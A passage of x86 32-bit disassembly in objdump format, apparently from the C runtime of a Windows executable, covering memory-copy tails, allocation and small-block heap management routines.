  4248f6:	mov    eax,DWORD PTR [ebp+0x8]
  4248f9:	pop    esi
  4248fa:	pop    edi
  4248fb:	leave  
  4248fc:	ret    
  4248fd:	lea    ecx,[ecx+0x0]
  424900:	mov    al,BYTE PTR [esi+0x3]
  424903:	mov    BYTE PTR [edi+0x3],al
  424906:	mov    al,BYTE PTR [esi+0x2]
  424909:	mov    BYTE PTR [edi+0x2],al
  42490c:	mov    eax,DWORD PTR [ebp+0x8]
  42490f:	pop    esi
  424910:	pop    edi
  424911:	leave  
  424912:	ret    
  424913:	nop
  424914:	mov    al,BYTE PTR [esi+0x3]
  424917:	mov    BYTE PTR [edi+0x3],al
  42491a:	mov    al,BYTE PTR [esi+0x2]
  42491d:	mov    BYTE PTR [edi+0x2],al
  424920:	mov    al,BYTE PTR [esi+0x1]
  424923:	mov    BYTE PTR [edi+0x1],al
  424926:	mov    eax,DWORD PTR [ebp+0x8]
  424929:	pop    esi
  42492a:	pop    edi
  42492b:	leave  
  42492c:	ret    
  42492d:	push   DWORD PTR [esp+0x4]
  424931:	call   DWORD PTR ds:0x4280ac
  424937:	xor    eax,eax
  424939:	inc    eax
  42493a:	ret    0x8
  42493d:	push   0x10
  42493f:	push   0x4285c0
  424944:	call   0x4238a8
  424949:	mov    eax,ds:0x45cd88
  42494e:	test   eax,eax
  424950:	jne    0x424989
  424952:	cmp    DWORD PTR ds:0x45cac4,0x1
  424959:	je     0x42497f
  42495b:	push   0x4285ac
  424960:	call   DWORD PTR ds:0x428018
  424966:	test   eax,eax
  424968:	je     0x42497f
  42496a:	push   0x428584
  42496f:	push   eax
  424970:	call   DWORD PTR ds:0x42801c
  424976:	mov    ds:0x45cd88,eax
  42497b:	test   eax,eax
  42497d:	jne    0x424989
  42497f:	mov    eax,0x42492d
  424984:	mov    ds:0x45cd88,eax
  424989:	and    DWORD PTR [ebp-0x4],0x0
  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
